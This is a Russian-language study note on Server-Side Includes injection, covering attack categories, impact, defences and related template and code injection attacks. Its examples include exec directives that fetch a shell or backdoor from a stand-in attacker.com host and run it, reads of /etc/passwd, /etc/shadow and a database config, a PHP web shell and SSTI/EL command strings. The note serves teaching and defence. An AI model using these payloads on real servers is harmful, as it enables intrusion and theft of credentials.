## **Что такое Server-Side Includes (SSI)?**

SSI — это простой scripting язык, который выполняется на сервере до отправки страницы клиенту. Обычно используется для включения общего контента (хедеры, футеры) или выполнения простых операций.

**Условие для атаки:** Веб-сервер должен быть сконфигурирован для обработки SSI (обычно файлы с расширениями `.shtml`, `.shtm`).

---

## **Категории SSI атак**

---

### **1. Remote Code Execution (RCE)**

Наиболее опасная категория — выполнение произвольных команд на сервере.

**Директивы:**
- `<!--#exec cmd="команда" -->` — выполнение системных команд
- `<!--#exec cgi="скрипт" -->` — выполнение CGI-скриптов

**Пример:**
``` html
<!-- Злоумышленник внедряет в поле комментария или формы -->
<!--#exec cmd="ls -la /etc/" -->
<!--#exec cmd="wget http://attacker.com/shell.txt -O /var/www/shell.php" -->
```

### **2. File Disclosure / Чтение файлов**

Получение содержимого файлов на сервере.

**Директивы:**

- `<!--#include file="путь" -->` — включение локальных файлов
- `<!--#include virtual="путь" -->` — включение через виртуальный путь

**Пример:**
```html
<!-- Чтение системных файлов -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/etc/shadow" -->
<!--#include file="/var/www/config/database.php" -->
```

### **3. Information Disclosure / Раскрытие информации**

Получение информации о системе и сервере.

**Директивы:**

- `<!--#echo var="DOCUMENT_NAME" -->` — имя документа
- `<!--#echo var="DATE_LOCAL" -->` — локальная дата
- `<!--#echo var="REMOTE_ADDR" -->` — IP клиента
- `<!--#echo var="DOCUMENT_URI" -->` — URI документа

**Пример:**
```html
<!-- Сбор информации о сервере -->
Server: <!--#echo var="SERVER_SOFTWARE" -->
Path: <!--#echo var="DOCUMENT_ROOT" -->
User: <!--#echo var="REMOTE_USER" -->
```

### **4. File Manipulation / Манипуляции с файлами**

Изменение атрибутов файлов (если разрешено).

**Директива:**

- `<!--#fsize file="путь" -->` — получение размера файла
- `<!--#flastmod file="путь" -->` — дата модификации

## **Импакт (Последствия)**

- **🟥 Полный компромисс сервера** через RCE
- **🟥 Утечка конфиденциальных данных** (конфиги, пароли, ключи)
- **🟧 Раскрытие структуры приложения** и системной информации
- **🟨 Denial of Service** через выполнение ресурсоемких команд
- **🟨 Дефейс сайта** через модификацию контента

---

## **Защита**

### **1. Конфигурация веб-сервера**

```apache
# Apache - отключение SSI
Options -Includes
# или более детально
Options -IncludesNOEXEC  # запрет exec
Options -IncludesNoExec  # в некоторых версиях

# Nginx - обычно не поддерживает SSI по умолчанию
```

### **2. Валидация и фильтрация входных данных**

```php
// Фильтрация SSI-директив
function sanitizeSSI($input) {
    $patterns = [
        '/<!--#\s*include\s+.*-->/i',
        '/<!--#\s*exec\s+.*-->/i',
        '/<!--#\s*echo\s+.*-->/i',
        '/<!--#\s*fsize\s+.*-->/i',
        '/<!--#\s*flastmod\s+.*-->/i'
    ];
    return preg_replace($patterns, '[SSI BLOCKED]', $input);
}
```

### **3. Content Security Policy**

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'">
```

### **4. Принцип минимальных привилегий**

- Запуск веб-сервера под пользователем с ограниченными правами
- Запрет на выполнение системных команд из веб-контекста

### **5. Регулярный аудит**

- Сканирование на уязвимости SSI injection
- Мониторинг логов на подозрительные паттерны

---

## **Похожие атаки**

---

### **1. Server-Side Template Injection (SSTI)**

[SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

Более современный аналог, затрагивающий шаблонизаторы:

- **Jinja2** (Python): `{{ 7*7 }}` → `49`
- **Twig** (PHP): `{{ _self.env.registerUndefinedFilterCallback("exec") }}`
- **Freemarker** (Java): `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`

![[SSTI.png]]

### **2. Code Injection**

Прямое выполнение кода:

- **PHP**: `<?php system($_GET['cmd']); ?>`
- **ASP**: `<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe").StdOut.ReadAll()) %>`
    

### **3. Expression Language Injection (EL Injection)**

В Java-приложениях:
- `${pageContext.request.getParameter("param")}`
- `${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc')}`

## **Ключевые различия**

|Атака|Контекст|Условия|Гибкость|
|---|---|---|---|
|**SSI Injection**|Веб-сервер (Apache)|Включена обработка SSI|Ограничена директивми SSI|
|**SSTI**|Шаблонизаторы приложения|Контроль над данными в шаблоне|Очень высокая (полный язык)|
|**Code Injection**|Интерпретаторы языка|Невалидируемый пользовательский ввод|Максимальная (прямое выполнение)|

## **Практический пример эксплуатации**

**Уязвимая форма:**
```html
<!-- page.shtml -->
<html>
<body>
<h1>Welcome <!--#echo var="REMOTE_USER" --></h1>
<!-- Пользовательский контент из БД -->
<div class="content">
    ${user_content}  <!-- уязвимое место! -->
</div>
</body>
</html>
```

**Атака:**
```html
Здравствуйте! Отличный сайт.
<!--#exec cmd="wget http://attacker.com/backdoor.sh -O /tmp/bd.sh" -->
<!--#exec cmd="chmod +x /tmp/bd.sh && /tmp/bd.sh" -->
<!--#include file="/etc/passwd" -->
```

**Защищенная версия:**
```html
<div class="content">
    ${escapeHtml(user_content)}  <!-- экранирование HTML-сущностей -->
</div>
```

SSI-атаки особенно опасны в системах, где пользовательский контент отображается без должной санитизации, а сервер настроен на обработку SSI-директив.